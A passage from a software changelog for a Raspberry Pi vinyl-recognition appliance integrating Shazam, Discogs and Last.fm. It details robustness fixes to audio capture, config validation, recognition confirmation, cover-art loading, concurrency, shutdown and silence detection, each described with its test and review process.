  PortAudio callback's `call_soon_threadsafe`; if the USB interface browns out or
  is unplugged mid-album (or the callback aborts from CFFI), the callback stops
  firing, nothing raises in the consumer, and `await blocks.get()` parked `run()`
  forever — capture silently dead while the process stayed alive, the display stuck
  in IDLE, nothing in the journal. `run()` now waits for each block with a
  `_BLOCK_STALL_TIMEOUT_SECONDS` (4s = 16 block intervals) timeout and, on a stall,
  raises into the existing tear-down + backoff + rebuild path, so a recovered device
  (or a fresh stream) resumes capture on its own. The PortAudio callback body is
  also wrapped so a callback exception logs instead of silently aborting the CFFI
  stream. RED-first (the hang reproduced); the timeout wrap, the timeout value, the
  rebuild-on-stall, and the callback guard are mutation-pinned; cold review SPEC /
  QUALITY PASS — buffered blocks win the `wait_for` race so a legitimate event-loop
  stall can't false-trip it, and the rebuild cycle is bounded (~0.2 Hz).
- **A domain-invalid config value is now one friendly startup error instead of a
  crash loop (CRIT-1, #92 — HIGH).** `config.py` validated field TYPES but never
  their value DOMAINS, so a plausible hand-edit — `sample_rate: 0`, a negative
  `overlap_seconds` — passed validation and then crashed the capture leg deep in
  `ChunkAssembler` (a `ValueError` on `chunk_frames <= 0` or `hop > chunk_frames`)
  with a raw traceback, which systemd's `Restart=on-failure` turned into a
  permanent 10-second crash loop and a black screen the owner finds hours later.
  Each section now runs value-domain checks accumulated into the SAME
  `ConfigError` as any type error — honoring config.py's "single source of truth"
  / "one friendly startup failure" promise: `sample_rate > 0`, `chunk_seconds > 0`,
  `overlap_seconds >= 0`, `width/height > 0`, `poll_interval_seconds > 0`,
  `confirmation_required >= 1`, `error_after_misses >= 1`. The finding's
  `overlap < chunk` upper bound is deliberately NOT enforced at config: an
  `overlap >= chunk` is a benign degradation `AudioCapture` already handles by
  disabling overlap (the appliance keeps running), so rejecting it would
  crash-loop an otherwise-functional appliance — only the genuinely-crashing
  `overlap >= 0` bound is enforced (a negative overlap makes `hop > chunk_frames`,
  which ChunkAssembler rejects, and AudioCapture's guard does not catch it).
  RED-first (the accepted-then-crashed value reproduced); every domain boundary
  and the type-error None-guard are mutation-pinned; cold review SPEC / QUALITY
  PASS — the overlap deviation independently execution-verified as more correct
  than the finding.
- **An unimplemented `recognition.backend` is now a friendly startup error, not a
  crash loop (CRIT-2, #93 — HIGH).** Only `shazamio` is built, but
  `config.example.yaml` advertised `acrcloud`/`audd` as options; selecting one
  passed config's type check and then raised `ValueError` from
  `RecognitionLoop.__init__` — constructed OUTSIDE main()'s only try/except (which
  wraps `load_config` alone) — exiting with a raw traceback into a systemd crash
  loop, exactly the CRIT-1 class. A new `IMPLEMENTED_BACKENDS` frozenset in
  `config.py` is the single source of truth: `RecognitionConfig` validates
  `backend` against it (landing in the same aggregated `ConfigError`), and
  `recognizer._init_backend` constructs against the same set, so config and
  construction can never drift. The example config's comment no longer advertises
  the unimplemented backends as selectable. RED-first (the accepted-then-crashed
  backend reproduced); the membership check, the set contents, and the
  direct-construction backstop are mutation-pinned; cold review SPEC / QUALITY
  PASS (no circular import, no drift, type-safe).
- **A track identified every OTHER chunk now confirms instead of latching the
  display to ERROR (REC-1, #94 — HIGH).** `_handle_result` zeroed the pending
  candidate (`_pending_result` + `_pending_count`) on *every* `None` result, so a
  confirmation needed N matching results with no intervening miss. On vinyl a
  hit/miss/hit/miss pattern is the *normal* failure mode (surface noise, a worn
  side): Shazam re-identified the same track every other chunk, the pending kept
  resetting so it never reached `confirmation_required`, and `_register_miss`
  drove the player to ERROR ("NO MATCH FOUND") — no now-playing card, no play
  count, no scrobble, recovery only via a manual needle reposition. A `None` result
  (which carries no recognition information) no longer discards the pending; the
  miss still counts toward the ERROR threshold, but a genuine alternating
  identification now confirms first, so ERROR fires only when the side is truly
  unrecognizable. Because a surviving pending is no longer session-bound by the
  wipe, the fix also session-scopes it: a new `_pending_epoch` tags each pending
  with the `session_epoch` it was built under, and a chunk from a *different*
  session discards the stale pending — closing a cross-session phantom-commit the
  first cold review caught (a single spurious live hit of the previous record
  could otherwise confirm a stale track into the NEXT record's session, a phantom
  the commit-boundary epoch guard cannot catch because the confirming audio is
  genuinely live). RED-first (both the ERROR-latch and the phantom-commit
  reproduced); the pending-preservation, the epoch-mismatch reset, and the
  epoch-tag are each mutation-pinned by their intended tests; cold review SPEC /
  QUALITY PASS, and a narrow second pass over the session-scoping rework could not
  break it (both scenarios execution-verified).
- **An un-decodable or display-faulted cover no longer becomes an unbounded
  download + unlink + log loop (STAB-1, #95 — HIGH).** `_render_now_playing`
  calls `_load_cover` every frame and re-arms the render loop each frame (unless
  `reduced_motion` is on), and `_load_cover`'s single `except Exception` treated
  ANY failure as "corrupt cached file": it unlinked the file and spawned a fresh
  download, with no failure counter, no negative cache and no spawn dedup. The
  re-download re-landed the same bytes, bumped `_cover_version` and set `_dirty`,
  so the cycle sustained itself at ~8.7 Hz — ~31k HTTPS GETs/hour, ~31k SD
  unlinks/hour, ~9 GB/hour of SD writes and ~31k journald WARNINGs/hour,
  indefinitely and unattended. Worse, the same clause fired for a `pygame.error`
  raised by `.convert()` on an HDMI/X video-mode loss, so a transient display
  glitch *deleted a perfectly good cover* and started hammering. The load path is
  now bounded: a per-URL decode-failure counter unlinks + refetches at most once
  (`_COVER_MAX_LOAD_FAILURES`), then negative-caches the URL (`_cover_bad_urls`)
  so later frames early-return with no disk/network/log until a state change to a
  new cover lifts it. Decode and convert are split into separate `try`s — a
  `pygame.image.load()` failure is corrupt bytes (bounded refetch); a
  convert/scale failure is a display fault on GOOD bytes, so the file is kept, no
  refetch is issued, and the warning is latched (`_cover_decode_deferred`) to one
  line per outage instead of ~10/second. Concurrent prefetches for one URL are
  deduped against an in-flight set. RED-first (the undecodable loop, the good-file
  deletion, and the double-download each reproduced); every load-bearing line is
  mutation-pinned by its intended test; cold review SPEC / QUALITY PASS. The cold
  review's narrow second pass caught a real regression — the fail-safe branch that
  stops a stray non-`pygame` error from crashing the unguarded render loop was
  itself an unbounded per-frame ERROR log — which was then folded into the same
  latch (WARNING for the expected video-mode fault, ERROR for the unexpected) and
  re-verified clean over a third pass. (A pre-existing, track-cadence — not
  frame-rate — palette-decode WARNING on a blacklisted-but-on-disk cover was
  surfaced and filed separately, not folded in.)
- **A slow end-of-session Discogs write no longer stalls recognition of the next
  record (CONC-2, #96 — MEDIUM).** `_end_session` held `_lifecycle_lock` for the
  whole of `_finalize_session` — up to three executor-dispatched HTTP round trips
  (Play Count, Last Played, Last.fm love), each bounded-retried. `on_track_identified`
  takes that same lock first and is awaited inline by the recognition pipeline
  (`TrackCommitService.commit → RecognitionLoop.run`), so a slow Play Count write
  for the record that just ended was one-for-one dead time for recognition: drop
  side B within 20s of side A ending on a slow uplink and every confirmed track of
  side B blocked on the lock while `RecognitionLoop` stopped draining its
  maxsize-5 audio queue, so side B's opening was never identified. The session is
  now **detached synchronously** under the lifecycle lock (`_detach_session_locked`,
  which — being await-free — also strengthens the B-2 atomicity), and the crediting
  runs **outside** the lock. A dedicated `_finalize_lock` serializes the crediting
  work so moving it off the lifecycle lock doesn't let two detached sessions hit
  the shared Discogs `requests.Session` (`max_workers=2` pool) concurrently; the
  two locks are never nested, so there's no deadlock. RED-first (the stall
  reproduced: a stuck credit blocked `on_track_identified` on today's code); the
  finalize-outside-the-lock move and the finalize-lock serialization are each
  mutation-pinned, and the B-2 split-race + idempotency suites still pass. Cold
  review SPEC / QUALITY PASS, verifying no double/lost credit, no deadlock, and an
  intact B-2 / CONC-1 (drain) / CONC-6 (is_stale). It surfaced one bounded residual
  — an album-split credit is still awaited inline and takes `_finalize_lock`
  unconditionally, so a split commit can briefly wait behind an unrelated in-flight
  credit (strictly better than before, filed as #166) — resolved here as a comment
  correction, not a scope-creeping behavior change.
- **A genuine network timeout on the recognize/commit path is now logged and
  backed off instead of silently swallowed (CONC-4, #97 — MEDIUM).** In
  `RecognitionLoop.run()` the `wait_for` timeout — meant only to signal "no audio
  queued" — shared one `try` with `backend.recognize()` and `_handle_result()`.
  On Python 3.11 `asyncio.TimeoutError` IS `builtins.TimeoutError` (== a socket
  timeout, and the base of aiohttp's `ServerTimeoutError`), so a real network
  timeout on the resolve/commit path was caught by `except asyncio.TimeoutError:
  pass`, classified as an idle poll, and retried immediately — hot-spinning on a
  failing network with nothing in the journal, while the sibling `except Exception`
  one line down would have logged it and backed off. The `try` is now split so the
  `except asyncio.TimeoutError` covers ONLY the queue `wait_for` (`continue` on an
  idle poll); `recognize()` + `_handle_result()` sit in a second `try` whose
  `except Exception` logs and `sleep(2)`-backs-off any error — a genuine
  `TimeoutError` included. `asyncio.CancelledError` is a `BaseException`, so a task
  cancel still unwinds the loop cleanly. RED-first (the swallowed timeout
  reproduced); the try split, the idle-path `continue`, and the broad error
  handler are each mutation-pinned; cold review SPEC / QUALITY PASS (clean
  cancellation at every await point, no lost behavior). The recognize call still
  has no per-call timeout — that is the separate PCONC-2 (#100), out of scope here.
- **Shutdown no longer hangs on the interpreter's default thread pool (CRIT-3,
  #98 — MEDIUM).** After `main()` returned, `asyncio.run()` on Python 3.11 awaits
  `loop.shutdown_default_executor()`, a `shutdown(wait=True)` join with no timeout.
  Every non-Discogs blocking call funnelled through that default pool — Last.fm
  scrobble/love, cover download, palette extraction, MusicBrainz cover-art lookup,
  WAV encode — so a backed-up queue of them (side A's credit in flight over a slow
  link, side B's scrobbles behind it) made process exit wait for the WHOLE queue
  to run; with no `TimeoutStopSec` in the documented unit, systemd SIGKILLed at its
  90s default, which is exactly when CONC-1's half-written collection update
  becomes permanent. The app now OWNS that pool: `install_io_executor` creates a
  bounded `ThreadPoolExecutor` and makes it the loop's default (so all six
  `run_in_executor(None, …)` sites route to it; the Discogs writes keep their own
  dedicated pool, #61), and `run_pipeline`'s finally shuts it down with
  `wait=False, cancel_futures=True` as the last teardown step — after `drain()`,
  so an in-flight credit's Last.fm love isn't dispatched to a closed pool. That
  drops QUEUED blocking work at exit instead of waiting on it (measured: a
  backed-up queue that made shutdown take 6.0s now takes 2.0s). A call already
  RUNNING on a worker can't be interrupted (Python can't kill a thread), so the
  documented systemd unit gains `TimeoutStopSec=30` as the backstop. RED-first
  (run_pipeline didn't own the pool's shutdown); the shutdown call, its
  `cancel_futures`/`wait` flags, and the `set_default_executor` routing are each
  mutation-pinned (the routing via a new `install_io_executor` extracted for
  testability); cold review SPEC / QUALITY PASS — routing, drain-then-close
  ordering, double-shutdown idempotence, and no closed-pool dispatch all
  execution-verified. The owned pool is sized to the interpreter default's width
  (8) rather than narrower, so the recognition-hot-path WAV encode is never queued
  behind a burst of slow network I/O.
- **A tracker fault on SESSION_ENDED can no longer strand the now-playing card
  (CRIT-5, #99 — MEDIUM).** The silence-event handler was a SINGLE Signal listener
  doing two independent effects — `tracker.on_silence_event(event)` then, for
  SESSION_ENDED, `state.clear()`. `Signal.emit` is log-and-continue, which
  protects listeners from EACH OTHER but not the second half of one listener from
  the first: a raise in `tracker.on_silence_event` skipped `state.clear()`, so the
  B-1 session epoch never bumped and the now-playing card stayed on screen with
  only a log line in a journal nobody reads. It is now split into two separately
  registered listeners (via a new `wire_silence_listeners`, extracted for
  testability) — the player-state effect (`apply_state_silence_effect`) and the
  tracker's `on_silence_event` — so the Signal's log-and-continue applies BETWEEN
  them: a fault in either half can't skip the other. The state listener is
  registered first, honoring the finding's "clear before scheduling the tracker
  end"; that ordering is otherwise a no-op (post-CONC-2 the tracker's session
  detach runs in the `_end_session` task it schedules, which fires only after the
  synchronous emit unwinds, so the epoch bump is synchronous in either order) — a
  comment that over-claimed a concurrency benefit here was corrected after cold
  review. RED-first (the stranded-card fault reproduced); the split, the
  listener order, and the state effect are each mutation-pinned (reverting to the
  single combined listener is killed by the fault test); cold review SPEC / QUALITY
  PASS, verifying fault isolation both directions, every AudioEvent still reaching
  the tracker, and no new race with CONC-2/CONC-6.
- **A hung recognition call can no longer occupy the loop for minutes (PCONC-2,
  #100 — MEDIUM).** `RecognitionLoop.run()`'s only `wait_for` guarded the audio-
  queue `get()`, not `backend.recognize()` — and shazamio's default retry policy
  is `attempts=20 × max_timeout=60`, so a single degraded call over flaky Pi wifi
  could run for minutes, saturating the maxsize-5 audio queue until the consumer
  worked on 40–50s-old audio (the lag PCONC-1 needs). `recognize()` is now wrapped
  in its own `asyncio.wait_for`: a timeout cancels the call (a BaseException the
  backend's `except Exception` can't swallow) and surfaces as a `TimeoutError` to
  CONC-4's handler (logged + backed off; the next chunk retries). The bound is a
  DEDICATED `recognize_timeout` (30s ≈ 3× the chunk hop cadence), deliberately
  NOT `poll_interval` — cold review showed reusing the idle-poll timeout would let
  a low `poll_interval_seconds` silently cap every real Shazam round-trip and
  latch the display to ERROR. shazamio's retry policy is also pinned explicitly
  (`Shazam(http_client=HTTPClient(retry_options=ExponentialRetry(attempts=2,
  max_timeout=5, statuses={500,502,503,504,429})))`) — `attempts=2` is the
  operative bound (`max_timeout` is aiohttp_retry's backoff cap, pinned low only
  so we never inherit the 60s default; `run()`'s `wait_for` is the hard backstop
  for a hung request). RED-first (the hung call reproduced occupying the loop);
  the `wait_for`, the timeout value's decoupling from `poll_interval`, the
  pinned retry attempts/statuses, and the non-empty (`repr`) timeout log are each
  mutation-pinned; cold review SPEC / QUALITY PASS and a narrow second pass over
  the reviewer-prompted rework verified the decoupling, cancellation cleanup, and
  no session leak (shazamio builds its aiohttp session per-request).
- **A Shazam JSON null in a string field no longer stalls the display forever
  (REC-2, #101 — MEDIUM).** `_parse_shazam` read `subtitle`/album metadata with
  `.get(key, "")`, which returns `None` (not the default) when the key is present
  with a JSON null — Python's `dict.get` only falls back to the default on a
  MISSING key. So a `{"title": "…", "subtitle": null}` response parsed cleanly to
  `artist=None`; `_same_track` then called `artist.strip()` and raised
  `AttributeError` inside `_handle_result` — OUTSIDE `recognize()`'s try, so it
  escaped to `run()`'s handler (log.error + sleep) with NO miss counted, leaving
  the display stuck on the IDENTIFYING spinner indefinitely while the journal
  filled once per chunk. (REC-3 had already coerced the title read, closing that
  half.) Every string field the parser reads and later feeds to a string method
  is now coerced with `… or ""` — `subtitle`→artist, the album-metadata `title`
  (a null would crash `.lower()`) and `text` — and `_same_track` guards all four
  of its reads (`(a.title or "").strip()…`) as defense-in-depth. RED-first (the
  stall and both null crash paths reproduced); each coercion and each `_same_track`
  guard is mutation-pinned; cold review SPEC / QUALITY PASS, confirming the stall
  is closed (a miss is now counted) with no behavior change on non-null values and
  REC-3's titleless rejection intact. A sibling, safe-degrading class the review
  surfaced — JSON-null CONTAINERS (`sections`/`metadata`) that crash the parser's
  iteration but are caught by `recognize()` and degrade to a miss, not the stall —
  was filed separately (#167) rather than folded in.
- **The `session_end_silence_seconds` knob now measures from when the silence
  actually began, so 45s no longer means 60-70s (SIL-1, #102 — MEDIUM).** A chunk
  is a `chunk_seconds` (15s) *trailing* RMS window emitted every hop
  (`chunk_seconds - overlap_seconds` = 10s), so the first fully-below-threshold
  chunk lands 15-25s after the needle actually lifted — yet `_silence_since` was
  armed at the moment that late chunk was *processed*. The configured 45s was
  therefore measured from a point ~15-25s too late: a needle lift at t=60.25s
  fired SESSION_ENDED at t=130.0s (69.75s latency, 55% over the documented value),
  delaying the Discogs play-count credit and the return to IDLE, and making the
  knob impossible to tune meaningfully. The music→silence transition now back-dates
  the timer to `now - chunk_seconds` — the start of the trailing window, where the
  silence genuinely began. This removes the whole `chunk_seconds` component; an
  up-to-one-hop residual remains because detection is still sampled on the chunk
  grid (so a 45s threshold now fires at ~45-55s, not exactly 45s) — that residual
  is documented honestly in `config.example.yaml` and in-code rather than papered
  over, since removing it would require sub-chunk RMS sampling (out of scope). The
  `reset_music_state` (B-6 outage-recovery) arming is deliberately left at bare
  `now`: after a stall of unknown duration there is no window to back-date to, and
  a cold-review attack on that asymmetry confirmed the two sites model different
  physics and cannot corrupt each other. RED-first (a white-box test pinning the
  armed value plus a corrected-deadline SESSION_ENDED test, both red on today's
  code); four mutants — revert the back-date, flip its sign, zero the window,
  swap in the wrong attribute — all killed, the white-box test firing on every
  one; cold review SPEC / QUALITY PASS with an executed reproduction confirming the
  latency drop (130.0s → 115.0s in the finding's own scenario) and no premature or
  wrong-chunk fire even when `session_end < chunk_seconds`. The review also surfaced
  a *pre-existing* gap it labeled out of scope — `session_end_silence_seconds`
  accepts `0`/negative because CRIT-1's value-domain sweep missed it — filed
  separately (#168) rather than folded into this fix.
- **A crash loop can no longer pin the Discogs API in 429 territory by re-paging
  the whole collection every 10 seconds (STAB-4, #103 — MEDIUM).**
  `_get_collection_index` walked the collection in an unbounded `while True` whose
  only exits were an empty page or `page >= pagination.pages`, and cached the
  result in memory only — so every process start rebuilds it from zero. Paired with
  the documented unit's `Restart=on-failure` / `RestartSec=10`, a persistent crash
  (a config that survives validation, a wedged dependency) becomes a permanent
  hammer: a 1,000-record collection re-pages ~10 GETs every 10s = 60 GETs/min,
  which *is* the authenticated rate limit, so the appliance sits permanently at
  429 — each 429 also sleeping up to 10s in a shared executor worker. Two bounded,
  low-risk brakes (the disk-cache remedy was deliberately deferred — see below):
  an **absolute page cap** (`_MAX_COLLECTION_PAGES = 1000` = 100,000 releases, far
  above any real personal collection) stops a malformed/hostile `pagination.pages`
  (or a logic bug) from paging without end — it breaks with the partial index and
  still caches it, so it is not re-hammered per track, and a partial index can only
  cause false-negatives, never a wrong write target (the truncated entries still
  pair each `release_id` with its own `instance_id`); and
  **`StartLimitIntervalSec=300` / `StartLimitBurst=5`** on the systemd `[Unit]`
  tells systemd to stop retrying after more than 5 starts in 300s, dropping the
  unit into a `failed` state (`start-limit-hit`) so a genuinely broken boot goes
  quietly dark instead of pinning the API. Both mechanisms reproduced first (the
  unbounded loop ran past 5,000 pages; a fresh reader re-paged the full 10 GETs on
  every simulated restart); RED-first; five mutants — disable the cap, off-by-one,
  cap-too-low, cap-too-high, fire-but-never-terminate — all killed; cold review
  SPEC / QUALITY PASS, which independently verified end-to-end that a partial index
  reaches the writer only as `instance_id=None` (no wrong write) and that the
  `[Unit]` placement is valid for every Raspberry Pi OS systemd (≥ v229). The
  finding's third remedy — **disk-persisting the index with a TTL** — was
  deliberately NOT taken here: it does not stop the crash loop (a crash before the
  build never touches the cache; the loop still hammers systemd) and it would add a
  stale/corrupt on-disk `instance_id` as a new write-target vector — exactly the
  class Wave 1 spent 16 issues closing — so it is filed as its own efficiency issue
  (#169) rather than ridden in on a hardening fix.
- **A first-boot display or cache-dir failure now prints an actionable remedy
  instead of a bare traceback (ARCH-10, #104 — LOW).** `main()` guarded only
  `load_config()`; component construction and `display.start()` were bare. On the
  Pi's first power-on — the app has never run on real hardware — the two most
  probable failures surfaced as stack traces naming no fix: `display.start()` →
  `pygame.error` ("No available video device") when HDMI isn't detected or X isn't
  up on `:0`, and construction → `OSError` from `CoverArtCache.__init__`'s
  `mkdir` when `display.cover_art_cache_dir` isn't writable. Both are now wrapped:
  construction moved into `build_components(config, state)` and the display init
  into `start_display(display)` (extracted, like the T-1 helpers, so both are
  unit-testable), each logging one concrete operator message — the cache-dir
  setting to check, or the HDMI/`DISPLAY`/X checks and the `Environment=` lines in
  the systemd unit — pointing at a new "Display / startup won't initialize" section
  in `docs/first-boot-checklist.md`, then **re-raising** so the process still exits
  non-zero (systemd handles it, bounded by STAB-4's `StartLimitBurst`). Both
  failure modes reproduced first (a `NotADirectoryError` from the mkdir and a
  `pygame.error` from `set_mode`, neither carrying any remedy); RED-first; six
  mutants — each guard's re-raise and log-level, plus a dropped and a mis-wired
  bundle field — all killed; cold review SPEC / QUALITY PASS, which independently
  re-verified that the extraction preserved every wiring identity (the shared A-4
  `discogs_http`, `commit_service.commit` reaching the recognizer, the tracker
  wired into the silence listeners equalling the one handed to `run_pipeline`), that
  both guards re-raise the original exception (never swallow), that
  `KeyboardInterrupt`/`SystemExit` still propagate uncaught, and that the I/O
  executor is not leaked on the abort path. Two LOW nits it raised were fixed in
  place: an inaccurate "missing parent directory" hint (an auto-created parent is
  not a failure cause) and a non-None-only bundle assertion tightened to per-field
  type checks. A pre-existing, benign resource nit it surfaced — `discogs_http`'s
  dedicated pool isn't explicitly closed when startup aborts before `run_pipeline`
  (atexit still joins the idle threads; no hang) — was filed separately (#170).
- **A crash in the fire-and-forget end-of-session credit is now logged, not
  swallowed into a detached GC warning (CONC-3, #105 — LOW).** The SESSION_ENDED
  credit runs as a fire-and-forget `asyncio` task, and its done-callback was a bare
  `self._bg_tasks.discard` — it dropped the strong reference but never retrieved
  `task.exception()`. Most write failures inside the credit path are already caught
  and bounded-retried (`_finalize_write_with_retry`, #163), but a path that RAISES
  rather than returning False — most concretely a raising `update_last_played`, or
  any unexpected error — propagated out of `_end_session` into nothing: the only
  trace was asyncio's `Task exception was never retrieved`, emitted from the garbage
  collector at an arbitrary later time and detached from the SESSION_ENDED that
  caused it, so the operator saw no error in the same log that records every other
  write outcome. The callback is now `_on_end_session_done`, which discards the
  reference AND retrieves the exception, logging one ERROR naming the failure when
  the task raised — guarding `task.cancelled()` first, because shutdown/loop
  teardown can cancel an in-flight credit (which `drain` already warns about) and
  calling `.exception()` on a cancelled task itself raises `CancelledError`.
  RED-first (a raising `update_last_played` reproduced the swallow — a detached GC
  warning, no operator-visible ERROR); five mutants — revert to the bare discard,
  downgrade the log level, drop the reference-cleanup, drop the cancelled guard,
  invert the has-exception check — all killed; cold review SPEC / QUALITY PASS,
  which empirically confirmed the `.exception()` retrieval suppresses the detached
  GC warning (1 → 0), that the success path is unchanged (unconditional discard,
  silent), and that there is no double-log against `drain`. This is a VISIBILITY
  fix: the finding explicitly accepts that the session's Last Played / Last.fm love
  are skipped when a write raises after the Play Count landed, and asks only that
  the failure be surfaced. A pre-existing seam the review noted in passing — the
  "love runs independently of a Discogs failure" comment holds when a write returns
  False but not when it RAISES (the raise short-circuits the love block) — was filed
  separately (#171) rather than folded in.
- **A NaN (or inf) in an audio window no longer fakes a needle lift mid-record
  (SIL-2, #106 — LOW).** `process()` computed `rms = √mean(audio²)` and compared
  `rms >= threshold` with no finiteness guard. A single NaN sample out of the
  ~661,500 in a 15s window poisons `np.mean`, making `rms` NaN — and `nan >= x` is
  False in IEEE-754, so the whole chunk fell through to the SILENCE branch: it
  flipped `_is_music` to False, armed `_silence_since`, and emitted a false
  MUSIC_STOPPED. Because the wall-clock ticker evaluates the end-of-session timer
  independently of chunk flow, a NaN burst ~45s before a side ends could fire
  SESSION_ENDED early — clearing the now-playing card and (downstream) crediting an
  unfinished side. An `inf` is the mirror (`inf >= threshold` is True) and would
  fake MUSIC_STARTED. The fix guards the aggregate: `if not math.isfinite(rms)`,
  log a warning and RETURN before any state change or `time.monotonic()` read — a
  corrupt chunk is evidence of neither silence nor music, so it is skipped and the
  next clean chunk drives detection. RED-first (a one-sample NaN reproduced the
  fake silence; an inf the fake music start); three mutants — disable the guard,
  invert it, log-without-return — all killed (the cold review additionally verified
  an `isnan`-only and an `isinf`-only partial guard each fail one test, so both
  finiteness directions are pinned); cold review SPEC / QUALITY PASS, which
  confirmed the skip leaves `_is_music` / `_silence_since` / `_session_ended`
  untouched, that a genuine end-of-session still fires via the ticker and the
  level-triggered `_check_session_end` (a NaN coinciding with a real needle lift
  costs at most the already-documented SIL-1 one-hop latency, never a lost
  transition), and that an overflow-to-`inf` cannot arise from normalized float32
  capture. A persistently all-NaN stream — a severe driver fault, not a stall — now
  stays in the music state rather than firing a false SESSION_ENDED (the intended
  consequence); a permanently corrupt input is a hardware fault outside the
  detector's remit.
- **The silence detector no longer flaps when the RMS hovers at the threshold
  (SIL-4, #107 — LOW).** A single threshold with no dead band meant an RMS
  oscillating right at the boundary produced an unbounded MUSIC_STARTED/MUSIC_STOPPED
  alternation — the finding measured eight events from a 0.000002 amplitude swing
  (0.010001 / 0.009999). Each return to music cleared `_session_ended` and each drop
  re-armed `_silence_since` from scratch, so a signal sitting at the boundary could
  churn indefinitely and hold SESSION_ENDED off, never crediting the finished side.
  The fix adds **hysteresis**: `process()` now branches on the current state —
  music is *entered* at `silence_threshold_rms` but only *left* once the RMS falls
  below `_MUSIC_EXIT_RATIO` (0.5) × that threshold. An RMS in the dead band
  `[½·threshold, threshold)` holds whichever state is current instead of flapping,
  with no added transition latency. The tradeoff, documented in
  `docs/first-boot-checklist.md` §2: hysteresis lowers the *effective* silence bar
  to half the threshold, so the run-out / room noise floor must sit below that for
  SESSION_ENDED to fire — the operator tunes `silence_threshold_rms` to comfortably
  more than 2× the noise floor. (This is a first-boot tuning note, not an upgrade
  hazard: the appliance has never run on the Pi, so the threshold is tuned for the
  first time with this guidance present.) RED-first (the flap reproduced, plus the
  dead-band hold); five mutants — ratio 1.0 (dead band collapses), ratio 0.0 (music
  never left), leave-on-the-enter-threshold, enter-on-the-exit-threshold, inverted
  comparison — all killed; cold review SPEC / QUALITY PASS, which independently
  reproduced the flap now gone, confirmed the restructure preserved the SIL-1
  back-date, the SIL-2 non-finite guard, the wall-clock ticker, and
  `reset_music_state`, and measured the dead-band tradeoff (judged acceptable and
  documented). A doc-precision nit it caught — the tuning target had landed exactly
  on the strict-`<` exit boundary — was fixed in the checklist wording.
- **A state change delivered without a running event loop can no longer raise out
  of the display layer (DISP-8, #108 — NIT).** `_on_state_change` is a synchronous
  `PlayerState` callback that scheduled a cover-art prefetch via
  `self._spawn(self._prefetch_cover(url))` → `asyncio.create_task` — UNGUARDED —
  while the corrupt-cover re-fetch path (`_handle_corrupt_cover`) wrapped the
  identical call in an explicit `asyncio.get_running_loop()` / `except RuntimeError`
  guard precisely because it can run without a loop. The two call sites disagreed;
  if a state change is ever delivered from an executor thread or before the loop
  starts, `create_task` raises `RuntimeError('no running event loop')` out of the
  renderer's callback and back into the notifying recognition pipeline, which does
  not expect the display layer to raise. The guard now lives in `_spawn` — the
  single `create_task` site — so every caller is protected once: off-loop it closes
  the un-started coroutine (so it can't warn about never being awaited) and returns
  None, on-loop it schedules and tracks the task exactly as before. The redundant
  duplicate guard at `_handle_corrupt_cover` was removed. RED-first (an off-loop
  `_on_state_change` reproduced the `RuntimeError` leaking into the caller); three
  mutants — disable the guard, drop the `coro.close()`, drop the early return —
  all killed; cold review SPEC / QUALITY PASS, which verified both directions,
  that constructing-then-closing the coroutine is behaviorally identical to never
  constructing it (an `async def` body runs nothing until awaited), that the two
  `_spawn` sites are the only schedulers and both pass a fresh coroutine, and that
  the STAB-1 / B-18 bounded-refetch behavior is unchanged.

## [1.5.2] — 2026-08-03

**Code-review hardening, round 3 (Wave 1 — collection data integrity).** A third
adversarial cold audit (`CODE_REVIEW_2026-07-30.md`) filed 88 issues across five
milestones; this release lands the Wave 1 (collection data-integrity) fixes — the
one irreversible wave, shipped before the Pi is powered on — each through the same
implement → RED test → mutation-check → cold-review discipline.

### Fixed

- **A failed or untrusted read no longer resets the Play Count to 1 (META-1,
  #75 — CRITICAL).** `increment_play_count` is a read-modify-write ending in an
  absolute set. `_get_field_value` previously returned `None` for *every* read
  failure — a non-200, a network exception, or a 200 whose body did not contain
  the instance — which the caller could not tell apart from a genuinely blank
  field, so it treated the value as `0` and POSTed an absolute `1`, silently
  overwriting an accumulated count and logging success. `_get_field_value` now
  returns a three-state result — the value, `None` for a *confirmed-blank* field
  (safe `0`), or the `_READ_FAILED` sentinel for an *untrusted* read — and
  `increment_play_count` aborts (no POST, returns `False`) whenever the current
  value cannot be trusted.
- **A present, non-integer Play Count is no longer overwritten with 1 (META-2,
  #77 — HIGH).** A successful read that returns a non-integer value is real data
  that cannot be safely incremented; the increment now aborts and leaves the
  field untouched rather than clobbering it with an absolute `1`. Whitespace-only
  and empty values are still treated as a blank `0` (first play → `1`); the
  B-16 JSON-number coercion (`5` → `6`) is preserved.
- Both aborts log at ERROR with a distinct message, and the two guards are pinned
  independently by log-message assertions so neither can be removed unnoticed.

### Tests

- **Pinned `_get_collection_fields` — the field-name → field-ID map that selects
  which Discogs column a write lands in (MUT-1, #79).** Every writer test
  previously pre-seeded `writer._collection_fields`, so the fetch/build path had
  zero test executions and a mutation could silently reverse the name→id mapping
  (writing to the wrong column) with the suite still green. Added tests
  exercising the real fetch: the endpoint URL, the name→id direction, caching,
  HTTP-error propagation, and an end-to-end check that the resolved field-ID is
  the one that lands in the write URL. `writer.py` is now at 100% line coverage,
  and the five previously-surviving mutants there are killed.
- **An incomplete recognition no longer writes to an arbitrary owned record
  (SEC-1, #76 — HIGH).** `search_collection`'s strategy-2 fuzzy match used a bare
  substring test (`album_lower in title and any(artist_lower in a …)`). An empty
  Shazam album or artist — or even a single space, which is a substring of most
  titles — made that test vacuously true, so it returned the most-recently-added
  owned release, whose `instance_id` then became the Play Count / Last Played
  write target: a junk match became a wrong write to real collection data.
  `search_collection` now returns `None` when the artist or album is empty or
  whitespace-only, so the track resolves via the database/fallback tiers (no
  `instance_id`, no write) instead of crediting a play to the wrong record. The
  intentional substring fuzz (which catches reissues like "The Wall" vs "The Wall
  (Remastered)") is preserved, and legitimately short titles ("4", "Q") still
  match — only empty/whitespace terms are rejected.
- **A titleless Shazam response no longer confirms as a real track (REC-3, #81 —
  HIGH).** `_parse_shazam` built a `RawRecognitionResult` even when the `track`
  object had an empty, missing, or `null` title, so two such junk responses
  matched each other, reached `confirmation_required`, and were committed
  (resolved, displayed, and — before SEC-1 — a wrong-collection-write risk). The
  title is the track's identity, so `_parse_shazam` now returns `None` when it is
  empty/whitespace/missing/null, and the recognition loop counts it as a miss.
  A title-only track (no artist) is still a valid partial match. As a side
  effect this also resolves the `title: null` half of REC-2 (a null title no
  longer reaches — and crashes — the dedup comparison); the null-*artist* half
  remains tracked separately under REC-2.
- **Shutdown no longer tears an in-flight end-of-session credit in half
  (CONC-1, #76 — HIGH).** The end-of-session Play Count / Last Played write runs
  as a fire-and-forget task in the tracker's `_bg_tasks`; it is not one of the
